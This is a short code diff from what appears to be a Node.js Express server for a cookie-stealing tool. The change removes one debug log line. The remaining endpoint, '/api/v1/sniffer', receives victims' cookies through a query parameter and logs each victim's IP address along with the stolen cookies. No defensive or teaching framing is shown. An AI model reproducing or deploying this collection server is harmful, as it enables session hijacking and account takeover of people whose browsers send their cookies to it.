@@ -92,7 +92,6 @@ app.post('/api/v1/auth', function(request, response) {
 });
 
 app.get('/api/v1/sniffer',function (request, response) {
-    console.log(request.query)
     console.log(chalk.hex('#d6af42')(Main.formatConsoleDate(new Date())) + ` ${chalk.green('New cookies logged')} : 
     Ip => ${request.connection.remoteAddress}, 
     ${request.query.cookies.split(";").length} cookie(s) => ${JSON.stringify(request.query.cookies)}, 
